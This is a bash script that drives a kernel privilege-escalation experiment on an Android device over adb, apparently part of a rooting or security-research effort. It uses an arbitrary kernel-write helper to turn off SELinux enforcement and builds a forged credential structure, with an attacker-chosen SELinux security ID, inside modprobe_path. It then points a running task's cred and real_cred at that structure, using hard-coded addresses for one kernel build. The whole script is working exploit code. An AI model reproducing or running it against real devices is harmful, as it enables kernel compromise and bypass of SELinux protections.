#!/usr/bin/env bash
# Ask the question ledger 492 could not answer: is the silent execution of our rooted task keyed on
# the CREDENTIAL's SELinux domain (scontext=u:r:kernel:s0) or on uid 0 itself?
#
# Shape: instead of pointing task->cred at the static init_cred, point it at a cred WE place at a
# known address (modprobe_path[], whose contents are dead weight now that umh is judged dead) built
# from init_cred's own Image bytes -- so the pointer slots (`user`/`user_ns`/`group_info` at
# +0x78/+0x80/+0x88) are the values the kernel itself ships, and only these are overridden:
#   usage  +0x00  = 100000        (never reaches 0 => __put_cred never kmem_cache_free's our buffer)
#   ids    +0x04  = 2000 x8       (IDS=shell: the child stays an ordinary uid)
#   securebits +0x24 = SBMARK      (the child polls prctl(PR_GET_SECUREBITS): a plain load, so it
#                                  can see the patch WITHOUT us needing a root-visible field)
#   caps   +0x28..+0x47           (shell-mirrored: inh/prm/eff 0, bset 0xc0)
#   security +0x70 = &our own tsec  (witnessed: selinux_cred_prepare+0x10 `ldr x0,[x1,#0x70]`,
#                                  selinux_file_alloc_security+0x28 same, selinux_bprm_set_creds
#                                  +0x48/+0x50 same -- and it writes osid@+0/sid@+4, zeros the rest)
# Our tsec carries sid = FAKESID (1 = SECINITSID_KERNEL), so with IDS=shell the ONLY thing that
# differs from the child's real credentials is the SELinux domain.  If it still dies at
# open("/dev/null") the guard keys on the domain; if it lives, uid 0 is the trigger -- and the audit
# log names the sid for us (`scontext=u:r:...` for that pid), which is how FAKESID gets checked
# rather than assumed.
#
# Memory state only; adb reboot restores factory.
set -eu
set -o pipefail

ROOT=$(cd "$(dirname "$0")" && pwd)
SER=${SER:-$(adb devices | awk 'NR==2 && $2=="device"{print $1}')}
ADB="adb -s $SER"
DEV=/data/local/tmp
OUT=$DEV/cred.txt
WFILE=$DEV/wexec.txt
LOCAL=/tmp/wexec-fake.txt
IMG=$ROOT/../fw/7/Image

KREL=$($ADB shell uname -r 2>/dev/null | tr -d '\r')
case "$KREL" in
  3.18.31-perf-g9dce1fbc9*)
    SELINUX_ENFORCING=0xffffffc001d5dbe4
    MODPROBE_PATH=0xffffffc001a499b8	# run_temproot.sh's verified 7 profile
    INIT_CRED=0xffffffc001a4ad08	# art/ledger-20261016.md S487: read out of .data literals
    OFF_TASK_CRED=0x4c0; OFF_TASK_REALCRED=0x658 ;;
  *) printf 'ABORT: no verified profile for kernel %s\n' "$KREL" >&2; exit 1 ;;
esac

IDS=${IDS:-shell}		# shell = keep uid 2000; root = ids 0 + caps full
FAKESID=${FAKESID:-1}		# 1 = SECINITSID_KERNEL
SBMARK=${SBMARK:-64}		# 0x40: the securebits value the child polls for
ROUNDS=${ROUNDS:-12}
HOLD=${HOLD:-300}
NICE=${NICE:-7}
WKIDS=${WKIDS:-6}
TSECT_OFF=0x00			# our tsec lives at modprobe_path+0x00
FAKE_OFF=0x40			# the fake cred at modprobe_path+0x40 (176 bytes, < 256)
FAKEVA=$(python3 -c "print(hex($MODPROBE_PATH + $FAKE_OFF))")
TSECVA=$(python3 -c "print(hex($MODPROBE_PATH + $TSECT_OFF))")

addr_add() { python3 -c "import sys; print(hex(int(sys.argv[1],16) + int(sys.argv[2],16)))" "$1" "$2"; }

fire() {
	local i
	for i in 1 2 3; do
		if $ADB shell "$DEV/clobber 14 kern $1 hex:$2 4 0" 2>&1 | tr -d '\r' | grep -q 'CLOBBER OK'; then
			printf '  write %-22s <- %-20s… : OK (try %d)\n' "$1" "${2:0:20}" "$i"
			return 0
		fi
	done
	printf '  write %s : no hit in three batches\n' "$1" >&2
	return 1
}

grep -aq 'patch seen' "$ROOT/broot" || { printf 'ABORT: %s/broot predates the securebits trigger\n' "$ROOT" >&2; exit 1; }
for f in broot clobber; do
	$ADB push "$ROOT/$f" "$DEV/$f" >/dev/null 2>&1 || { printf 'ABORT: push %s\n' "$f" >&2; exit 1; }
	$ADB shell chmod 0755 "$DEV/$f" >/dev/null
done

printf 'kernel %s  IDS=%s FAKESID=%s securebits=%#x  fake cred=%s tsec=%s\n' \
	"$KREL" "$IDS" "$FAKESID" "$SBMARK" "$FAKEVA" "$TSECVA"
if ! $ADB shell getenforce 2>/dev/null | tr -d '\r' | grep -q Permissive; then
	fire "$SELINUX_ENFORCING" 00000000 || exit 1
	printf '  getenforce now: %s\n' "$($ADB shell getenforce 2>/dev/null | tr -d '\r')"
fi

printf '\n=== 1. name one of our children ===\n'
$ADB shell "rm -f $OUT $WFILE; cd $DEV; SPAN=0x400000 SIG=1 NICE=$NICE WCHILD=8 WKIDS=$WKIDS CHURN=20 BPFDS=6 PERROUND=3 SBMARK=$SBMARK HOLD=$HOLD setsid nohup $DEV/broot $ROUNDS > $OUT 2>&1 < /dev/null &" >/dev/null 2>&1
LINE=""
for _ in $(seq 1 $((ROUNDS * 12))); do
	LINE=$($ADB shell "grep -m1 -oE 'TASKVA=0x[0-9a-f]+ pid=[0-9]+.*' $OUT 2>/dev/null" | tr -d '\r') || true
	[ -n "$LINE" ] && break
	sleep 4
done
[ -n "$LINE" ] || { printf 'ABORT: needle never agreed\n' >&2; exit 1; }
printf '  %s\n' "$LINE"
TASK=$(sed 's/^TASKVA=//; s/ .*//' <<<"$LINE")
KID=$(sed 's/.* pid=//; s/ .*//' <<<"$LINE")

printf '\n=== 2. build the fake cred out of this Image (no kernel read involved) ===\n'
mapfile -t CH < <(python3 - "$IMG" "$INIT_CRED" "$TSECVA" "$IDS" "$SBMARK" <<'PY'
import struct, sys
img, init_cred, tsecva, ids, sbmark = sys.argv[1:6]
TB = 0xFFFFFFC000080000
data = open(img, 'rb').read()
base = int(init_cred, 16) - TB
c = bytearray(data[base:base + 0xb0])
assert struct.unpack_from('<I', c, 0x00)[0] == 4, "usage!=4: not init_cred?"
assert struct.unpack_from('<Q', c, 0x30)[0] == 0x3fffffffff, "cap_permitted!=CAP_FULL_SET"
for o in (0x78, 0x80, 0x88):
    v = struct.unpack_from('<Q', c, o)[0]
    assert 0xffffffc000000000 <= v < 0xffffffd000000000, "pointer slot %x is not a VA" % o
struct.pack_into('<I', c, 0x00, 100000)                      # usage
uid = 0 if ids == 'root' else 2000
for o in range(0x04, 0x24, 4):
    struct.pack_into('<I', c, o, uid)
struct.pack_into('<I', c, 0x24, int(sbmark))                 # securebits = the child's poll marker
if ids == 'root':
    for o in (0x30, 0x38, 0x40):
        struct.pack_into('<Q', c, o, 0x3fffffffff)
else:
    struct.pack_into('<Q', c, 0x28, 0)
    struct.pack_into('<Q', c, 0x30, 0)
    struct.pack_into('<Q', c, 0x38, 0)
    struct.pack_into('<Q', c, 0x40, 0xc0)                    # the shell's CapBnd, verbatim
struct.pack_into('<Q', c, 0x70, int(tsecva, 16))             # cred->security -> our tsec
assert struct.unpack_from('<Q', c, 0x70)[0] == int(tsecva, 16)
h = bytes(c).hex()
for i in range(0, len(h), 128):
    print(i // 2, h[i:i + 128])
PY
)
printf '  chunks: %s  (sizes: %s bytes)\n' "${#CH[@]}" "$(for line in "${CH[@]}"; do echo -n "$(( ${#2} / 2 )) "; done)"

# Wait until the child is past its binder-opening phase (it opens while i < 40) BEFORE patching:
# in the previous run the patch landed mid-phase and the next `open("/dev/binder")` crashed the box,
# which cannot be told apart from "the guard killed it".  The poll markers carry `v=<i>`, so the
# driver can time this itself instead of hoping.
printf '\n=== 2b. wait for the child to stop opening binder fds (v>=44) ===\n'
for _ in $(seq 1 60); do
	V=$($ADB shell "grep -oE 'poll pid=[0-9]+ .* v=[0-9]+' $WFILE 2>/dev/null" | tr -d '\r' | tail -1 | sed 's/.* v=//') || true
	[ -n "$V" ] && [ "$V" -ge 44 ] && { printf '  child at v=%s: binder opens are over\n' "$V"; break; }
	sleep 3
done
[ -n "$V" ] || { printf 'ABORT: no poll markers at all -- nothing was patched\n' >&2; exit 1; }

printf '\n=== 3. write tsec, then the cred, then redirect this child at it ===\n'
fire "$TSECVA" "$(python3 -c "import struct;print(struct.pack('<IIIIII',$FAKESID,$FAKESID,0,0,0,0).hex())")" || exit 1
i=0
for line in "${CH[@]}"; do
	set -- $line
	off=$(( i * 64 ))
	fire "$(addr_add "$FAKEVA" $off)" "$2" || exit 1
	i=$(( i + 1 ))
done
CREDHEX=$(python3 -c "import struct;print(struct.pack('<Q',int('$FAKEVA',16)).hex())")
fire "$(addr_add "$TASK" $OFF_TASK_CRED)" "$CREDHEX" || exit 1
fire "$(addr_add "$TASK" $OFF_TASK_REALCRED)" "$CREDHEX" || printf '  (real_cred not landed this batch -- the child is already patched through cred, so the test continues)\n'

printf '\n=== 4. the child answers: which syscall kills it this time? ===\n'
for _ in $(seq 1 $((HOLD / 4 + 30))); do
	$ADB shell "grep -qE 'L-open-devnull-rc|L-stat-path-rc|pre-execl|EXEC uid=|execl-FAILED|broken' $WFILE" >/dev/null 2>&1 && break || true
	sleep 4
done
$ADB pull $WFILE $LOCAL >/dev/null 2>&1 || true
python3 -c "
import re
t=open('$LOCAL','rb').read().decode('utf-8','replace')
keep=[l for l in t.splitlines() if l.startswith(('poll ','patch seen','L-','broken','pre-execl','EXEC','execl-FAILED'))]
print('  markers:', len(keep)); print('\n'.join(keep[-26:]))
" || true
printf '\n=== 5. what does the audit log call this task? (that is how FAKESID is checked, not assumed) ===\n'
$ADB shell "dmesg | grep -E 'pid=$KID ' | tail -n 6" 2>&1 | tr -d '\r' | sed 's/^/  /' || true
$ADB shell "ls -ld /proc/$KID 2>&1; ps -A -o USER,PID,NAME 2>/dev/null | grep -w $KID" 2>&1 | tr -d '\r' || true
$ADB shell "dmesg | grep -cE 'Internal error|Oops|BUG:|kernel panic|Unable to handle|tainted'" 2>&1 | tr -d '\r' | sed 's/^/  kernel fault lines: /' || true
